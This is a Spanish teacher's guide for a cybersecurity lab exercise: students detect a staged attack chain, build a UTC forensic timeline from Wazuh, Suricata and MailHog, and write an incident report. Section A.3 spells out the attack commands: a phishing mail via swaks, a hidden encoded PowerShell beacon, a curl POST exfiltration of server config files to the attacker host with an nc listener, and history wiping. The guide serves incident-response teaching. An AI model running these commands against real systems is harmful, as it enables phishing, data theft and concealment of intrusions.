---
title: "Actividad 2.5 · Informe forense — guion de resolución (profesorado)"
modulo: "MP5021 Incidentes de Ciberseguridade · UD2 · CA2.5 (incidente complejo) · CA2.3 (seguridad física)"
entorno: "labcyber completo · siem 172.21.10.10 · win10 .20 · srvweb .30 · kali .100 · MailHog en el siem"
---

# Actividad 2.5 · Informe forense

**Objetivo:** cerrar la unidad con un caso completo. El docente detona un ataque encadenado con un **componente
físico**; los grupos lo detectan, clasifican, reconstruyen la línea temporal en **UTC** y entregan un informe
forense con recomendaciones.

```
OSINT (2.3) ─▶ phishing (MailHog) ─▶ win10: PowerShell ─▶ srvweb: login con credencial filtrada ─▶ exfiltración HTTP
                         ▲
        acceso físico al CPD fuera de horario (la noche anterior, tarjeta de Lucía Pena)
```

| Parte | Quién | Contenido |
|---|---|---|
| A | Docente | Preparar detecciones y detonar el escenario (anotando las horas reales) |
| B | Alumnado | Detección, agrupación y línea temporal |
| C | Alumnado | Informe forense, MTTD y reflexión |

---

## A. Docente · preparación y detonación

### A.1 Componente físico: el control de accesos como fuente de logs (CA2.3)

El sensor de acceso se simula con un fichero de log en srvweb que lee el agente de Wazuh.

```bash
# srvweb
sudo touch /var/log/accesos_fisicos.log
sudo tee -a /var/ossec/etc/ossec.conf >/dev/null <<'EOF'
<ossec_config>
  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/accesos_fisicos.log</location>
  </localfile>
</ossec_config>
EOF
sudo systemctl restart wazuh-agent
```

```xml
<!-- siem · /var/ossec/etc/decoders/local_decoder.xml -->
<decoder name="accesofisico">
  <program_name>^accesofisico</program_name>
</decoder>

<decoder name="accesofisico-campos">
  <parent>accesofisico</parent>
  <regex>PUERTA=(\S+) TARJETA=(\S+) TITULAR=(\S+) RESULTADO=(\S+)</regex>
  <order>puerta,tarjeta,titular,resultado</order>
</decoder>
```

```xml
<!-- siem · /var/ossec/etc/rules/local_rules.xml (IDs 1005xx, libres) -->
<group name="local,acceso_fisico,">
  <rule id="100500" level="3">
    <decoded_as>accesofisico</decoded_as>
    <description>Acceso físico: $(puerta) · tarjeta $(tarjeta) ($(titular)) · $(resultado)</description>
  </rule>
  <rule id="100501" level="8">
    <if_sid>100500</if_sid>
    <field name="resultado">^DENEGADO$</field>
    <description>Acceso físico DENEGADO a $(puerta) con la tarjeta de $(titular)</description>
  </rule>
  <rule id="100502" level="12">
    <if_sid>100500</if_sid>
    <field name="puerta">^CPD$</field>
    <field name="resultado">^PERMITIDO$</field>
    <time>8 pm - 7 am</time>
    <description>Entrada al CPD fuera de horario con la tarjeta de $(titular)</description>
    <mitre><id>T1200</id></mitre>
  </rule>
</group>
```

```bash
# siem · probar sin reiniciar y después cargar
sudo /var/ossec/bin/wazuh-logtest
#   Nov  8 02:14:07 srvweb accesofisico: PUERTA=CPD TARJETA=0457 TITULAR=lpena RESULTADO=PERMITIDO
#   → decoder accesofisico · rule 100502 · level 12   (la regla <time> usa la hora del manager al procesar:
#     para la demo, detonar en horario de tarde-noche o ajustar el intervalo)
sudo systemctl restart wazuh-manager
```

### A.2 Detección de la exfiltración (Suricata)

```
# siem · /etc/suricata/rules/custom.rules
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"LAB posible exfiltracion: POST hacia el exterior"; flow:established,to_server; http.method; content:"POST"; classtype:policy-violation; sid:1000030; rev:1;)
```

`sudo suricata -T -c /etc/suricata/suricata.yaml && sudo systemctl restart suricata`

### A.3 Detonación (anotar la hora UTC de cada paso: es la «verdad» para corregir la línea temporal y el MTTD)

```bash
date -u +%FT%TZ    # antes de cada paso → hoja del docente
```

| # | Paso | Comando (docente) |
|---|---|---|
| 0 | Acceso físico la «noche anterior» | `echo "$(date '+%b %e %H:%M:%S') srvweb accesofisico: PUERTA=OFICINA TARJETA=0457 TITULAR=lpena RESULTADO=PERMITIDO" \| sudo tee -a /var/log/accesos_fisicos.log`<br>y a continuación la misma línea con `PUERTA=CPD` (en srvweb) |
| 1 | OSINT | Ya hecho en la 2.3: credencial `lpena / Marina2026!` filtrada |
| 2 | Phishing a Lucía | Desde kali: `echo "Revisa las nóminas" > nominas.txt; swaks --server 172.21.10.10:1025 --to lucia.pena@tecnomarina.local --from soporte@tecnomarina-soporte.local --header "Subject: Revisión urgente de nóminas" --body "Abre el documento adjunto" --attach-type text/plain --attach @nominas.txt` |
| 3 | Ejecución en win10 | PowerShell con comando codificado que contacta con Kali (fase 2 de la práctica purple):<br>`powershell -nop -w hidden -enc <base64 de "Invoke-WebRequest http://172.21.10.100:8080/beacon">` |
| 4 | Acceso a srvweb con la credencial | Desde kali: `ssh lpena@172.21.10.30` (sin fuerza bruta: un único login correcto) |
| 5 | Recolección y exfiltración | En srvweb como `lpena`: `tar czf /tmp/.b.tgz /var/www/html/dvwa/config 2>/dev/null; curl -s -X POST --data-binary @/tmp/.b.tgz http://172.21.10.100:8080/up`<br>En kali, antes: `nc -lvnp 8080 > recibido.bin` |
| 6 | Limpieza del atacante | `rm /tmp/.b.tgz; history -c` |

Para el paso 3, generar el base64 en PowerShell:
`[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Invoke-WebRequest http://172.21.10.100:8080/beacon'))`.

> El escenario es solo de laboratorio: todo ocurre dentro de labcyber, los correos quedan en MailHog y los dominios son ficticios.

---

## B. Alumnado · detección y línea temporal

### B.1 Qué buscar en cada fuente

| Fase | Fuente | Búsqueda en Wazuh (Threat Hunting) / comando |
|---|---|---|
| Físico | Wazuh (srvweb) | `rule.groups:acceso_fisico` → 100500, **100502** |
| Phishing | MailHog `http://172.21.10.10:8025` | Correo a lucia.pena, remitente de dominio parecido (`tecnomarina-soporte`), urgencia |
| Ejecución | Wazuh + Sysmon (win10) | `rule.groups:sysmon and data.win.eventdata.commandLine:*-enc*` (EID 1) · conexión a .100 (EID 3) |
| Acceso | Wazuh (srvweb) | `rule.id:5715 and data.dstuser:lpena` → login correcto **sin** fuerza bruta previa |
| Exfiltración | Suricata + Wazuh | `data.alert.signature_id:1000030` · `fast.log` |
| Limpieza | srvweb | `sudo ls -la /tmp`, `last -i lpena`, `/home/lpena/.bash_history` (vacío = sospechoso) |

### B.2 Construir la línea temporal en UTC

Las fuentes dan la hora en formatos distintos: Wazuh y Suricata con desfase (`+0100`), el syslog de
`accesos_fisicos.log` en **hora local sin zona**, MailHog en su interfaz. **Todo se pasa a UTC** antes de ordenar,
anotando la fuente y el formato original.

```bash
# siem · alertas relevantes de la ventana del ejercicio, ya ordenadas
sudo jq -r 'select(.rule.level>=3 and (.agent.name=="srvweb" or .agent.name=="win10" or any(.rule.groups[]?; .=="suricata")))
  | [.timestamp, .agent.name, .rule.id, .rule.level, .rule.description] | @tsv' \
  /var/ossec/logs/alerts/alerts.json | sort > ~/linea_wazuh.tsv

# convertir una marca a UTC
date -u -d "2026-11-08T11:12:31.000+0100" +%FT%TZ
date -u -d "Nov  8 02:14:07" +%FT%TZ       # syslog sin zona: se interpreta en la zona del equipo (comprobar con timedatectl)
```

Plantilla:

| Hora UTC | Fuente (formato original) | Evento | Equipo | Fase ATT&CK | Evidencia |
|---|---|---|---|---|---|
| 01:14:07 | accesos_fisicos.log (local, sin zona) | Entrada al CPD con tarjeta de lpena | — | T1200 (físico) | Alerta 100502 |
| 09:58:12 | MailHog | Correo «Revisión urgente de nóminas» | — | T1566 | Captura del correo |
| 10:03:40 | Sysmon EID 1 (Wazuh, +0100) | `powershell -enc …` | win10 | T1059.001 | Alerta + commandLine |
| 10:21:05 | sshd (Wazuh) | Login de `lpena` desde .100 | srvweb | T1078 | 5715 |
| 10:23:50 | — (inferido) | `tar` de la configuración de DVWA | srvweb | T1560 / T1005 (Collection) | Fichero `/tmp/.b.tgz` en el POST |
| 10:24:30 | Suricata | POST hacia .100 | srvweb | T1048 | sid 1000030 |
| 10:25:10 | `.bash_history` vacío, `/tmp` limpio | Limpieza del atacante | srvweb | T1070.003 Clear Command History · T1070.004 File Deletion | `ls -la /tmp`, historial vacío |

**Mapeo de la limpieza en ATT&CK v19** (error frecuente al corregir):

| Lo que hace el atacante | Técnica v19 | Táctica |
|---|---|---|
| `history -c`, borrar `~/.bash_history` | **T1070.003** Clear Command History | Stealth |
| `rm /tmp/.b.tgz` | **T1070.004** File Deletion | Stealth |
| `unset HISTFILE`, `HISTFILE=/dev/null`, `set +o history` (que no se grabe) | **T1690** Prevent Command History Logging | Defense Impairment |
| `wevtutil cl Security` → evento **1102** | **T1685.005** Clear Windows Event Logs | Defense Impairment |
| Borrar `/var/log/auth.log` | **T1685.006** Clear Linux or Mac System Logs | Defense Impairment |
| Parar el agente Wazuh o auditd | **T1685** Disable or Modify Tools (.001/.004 si es el registro) | Defense Impairment |

Regla para recordarlo: **borrar rastros propios** (historial, ficheros) sigue en *Indicator Removal* (Stealth);
**anular o vaciar los registros del sistema** pasa a *Defense Impairment*. En entregas con material anterior a v19
aparecerá T1070.001 (Clear Windows Event Logs) o T1562.003 (Impair Command History Logging): aceptarlo solo si indican la versión.

**Control (capa de IA):** si la IA ordena la línea, se verifican a mano la primera entrada, la última y tres al azar.
Si una falla, se rehace completa. Error típico: mezclar hora local y UTC e invertir el orden causal.

### B.3 Preservar evidencias (cadena de custodia)

```bash
# srvweb y siem
sudo cp /var/log/auth.log /var/log/accesos_fisicos.log ~/evidencias/ 2>/dev/null
sudo cp /var/log/suricata/fast.log ~/evidencias/
sha256sum ~/evidencias/* | tee ~/evidencias/HASHES.txt
```

Anotar quién, cuándo (UTC) y con qué comando se obtuvo cada evidencia.

---

## C. Informe forense (entregable)

1. **Resumen ejecutivo** (5 líneas, sin jerga): qué pasó, qué se vio afectado, qué se ha hecho, qué se recomienda.
2. **Alcance y fuentes** analizadas.
3. **Línea temporal** en UTC (tabla B.2).
4. **Análisis por fase** con evidencias: acceso físico, phishing, ejecución, acceso con credencial, exfiltración, limpieza.
5. **Clasificación y criticidad** (taxonomía 2.1 y matriz 2.4): Intrusión → compromiso de cuenta + Compromiso de la
   información → exfiltración; criticidad **alta/crítica** (datos de configuración del servidor web exfiltrados).
6. **Componente físico (CA2.3):** la tarjeta de lpena entró al CPD de madrugada mientras su credencial ya circulaba.
   Hipótesis a contrastar (no afirmar sin prueba): tarjeta clonada, préstamo de tarjeta o insider. Medidas:
   control de accesos con doble factor (tarjeta + PIN), alerta en tiempo real fuera de horario, CCTV, revisión de
   altas y bajas de tarjetas.
7. **IOC:** IP 172.21.10.100, remitente `soporte@tecnomarina-soporte.local`, cadena `-enc` de PowerShell, URL `/up`,
   tarjeta 0457.
8. **Recomendaciones:** rotar la credencial de lpena y retirar el secreto del historial del repositorio (2.3), MFA en
   SSH, regla de login desde orígenes no habituales, bloqueo de salidas HTTP no autorizadas, concienciación en phishing (UD1).
9. **Lecciones aprendidas** y **reflexión** del grupo.
10. **Anexos:** evidencias con `HASHES.txt`, capturas, reglas usadas.

### MTTD (ampliación)

MTTD = hora de detección (primer caso abierto o primera anotación del grupo) − hora real de cada paso (hoja del docente).
Comparar entre grupos y comentar qué fase tardó más en verse (suele ser el login correcto sin fuerza bruta).

## Rúbrica rápida

| Se valora | Penaliza |
|---|---|
| Todas las fases detectadas, con evidencia | Fases sin evidencia o supuestas |
| Línea temporal en UTC, ordenada y verificada | Mezclar husos horarios |
| Componente físico integrado y correlacionado con lo digital | Ignorar el evento físico |
| Hipótesis separadas de hechos | Afirmar culpables sin prueba |
| Recomendaciones concretas y priorizadas | Recomendaciones genéricas |
| Evidencias con hash | Evidencias sin custodia |
